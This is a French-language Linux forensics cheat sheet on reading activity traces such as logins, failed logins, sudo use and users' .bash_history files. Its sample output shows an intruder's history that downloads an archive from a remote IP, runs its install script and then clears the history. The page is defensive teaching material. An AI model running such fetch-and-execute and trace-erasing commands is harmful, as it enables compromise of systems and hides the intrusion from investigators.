---
title: "Traces d'activité"
cours:
  - library/cyber/forensic/investigation-numerique-forensic/index.md
  - library/cyber/detection/reponse-a-incident/index.md
---
# Traces d'activité

Qui s'est connecté, ce qui a échoué, ce qui a été tapé et modifié.

Les incontournables : `last` · `lastb` · `journalctl` · `.bash_history` · `find -newermt`
{ .kw-cs-top }

## Connexions et élévations

![[cheatsheets/linux/fondamentaux/systeme#Voir les dernières connexions]]

![[cheatsheets/linux/fondamentaux/logs#Trouver les échecs de connexion]]

![[cheatsheets/linux/fondamentaux/logs#Retrouver l'usage de sudo]]

## Commandes et fichiers

### Lire l'historique des commandes des utilisateurs

```bash title="Commande"
sudo cat /home/<utilisateur>/.bash_history   # commandes tapées par l'utilisateur, dans l'ordre
```

```bash title="Exemple"
sudo tail -n 50 /root/.bash_history
```

??? example "Sortie"
    ```text
    cd /tmp
    wget http://203.0.113.7/k.tar.gz
    tar -xzf k.tar.gz && ./install.sh
    history -c
    ```

```bash title="Exemple 2"
sudo find / -xdev -name ".*_history" -type f -exec ls -l {} \; 2>/dev/null   # tous les historiques (bash, zsh, python…)
```

!!! warning "Attention"
    L'historique n'est écrit qu'à la déconnexion et s'efface facilement : son absence est elle-même un indice.

![[cheatsheets/linux/fondamentaux/fichiers-recherche#Trouver les fichiers modifiés récemment]]

Étape suivante : [Clore la collecte](cloture.md)
{ .kw-cs-meta }
